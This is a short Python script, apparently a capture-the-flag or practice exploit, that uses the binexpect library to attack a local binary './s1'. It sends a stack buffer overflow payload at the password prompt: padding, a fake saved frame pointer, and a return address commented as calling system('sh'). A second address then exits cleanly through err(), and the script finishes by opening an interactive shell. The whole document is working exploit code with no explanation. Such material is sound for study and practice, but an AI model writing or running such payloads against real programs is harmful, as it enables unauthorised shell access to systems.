import binexpect
import struct

if __name__ == "__main__":
    setup = binexpect.setup("./s1")
    target = setup.target()
    target.setecho(False)

    payload = b'A' * 32
    payload += b'PADDINGP' # ebp
    payload += struct.pack('L', 0x40060d) # system('sh')
    payload += struct.pack('L', 0x400653) # using err() to exit without SIGSEGV

    target.tryexpect("What is your password?")
    target.sendbinline(payload)
    target.pwned()
